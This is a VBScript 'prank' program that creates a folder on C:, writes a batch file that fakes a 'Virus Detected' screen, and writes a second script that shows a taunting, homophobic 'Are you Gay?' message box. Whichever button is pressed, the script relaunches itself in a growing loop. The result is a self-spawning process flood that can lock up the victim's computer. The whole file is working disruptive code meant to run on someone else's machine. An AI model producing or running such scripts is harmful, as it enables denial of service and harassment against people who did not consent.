Set WshShell =  WScript.CreateObject("WScript.Shell")
Dim file, repeating

file = Array("start C:\ScriptFolderPrank\testfile.vbs","color a", "title Virus Detected", "@echo off","cd C:\Users\System32","tree", "ping www.google.com ","dir","ipconfig", "pause")
repeating = Array("Set WshShell =  WScript.CreateObject("&"""WScript.Shell"""&")","Dim x,y,z","z="&"""Are you Gay?"""&"","x = 1","Dim answer","answer = MsgBox(z, vbQuestion + vbYesNo + vbDefaultButton2, "&"""Message Box Title"""&")", "If answer = vbYes Then", "For y = 0 To x","WshShell.run "&"""C:\ScriptFolderPrank\testfile.vbs""","Next","else","For y = 0 To x","WshShell.run "&"""C:\ScriptFolderPrank\testfile.vbs""","Next","End If","x=x+1","y=0")

 


Function CreateFolderDemo()
   Dim fso, f
   Set fso = CreateObject("Scripting.FileSystemObject")
   If fso.FolderExists("C:\ScriptFolderPrank") Then
   Else
    Set f = fso.CreateFolder("C:\ScriptFolderPrank")
   End If
End Function
Private Sub createFile()
Set fso = CreateObject("Scripting.FileSystemObject")
   Set MyFile = fso.CreateTextFile("C:\ScriptFolderPrank\testfile.bat", True)
   For Each x In file
   MyFile.Write(x+vbCrlf)
   Next 
   MyFile.Close
End Sub
Private Sub createAnotherFile()
Set fso = CreateObject("Scripting.FileSystemObject")
   Set MyFile = fso.CreateTextFile("C:\ScriptFolderPrank\testfile.vbs", True)
   For Each x In repeating
   MyFile.Write(x+vbCrlf)
   Next 
   MyFile.Close
End Sub 
CreateFolderDemo()
createFile()
createAnotherFile()
WshShell.run "C:\ScriptFolderPrank\testfile.bat"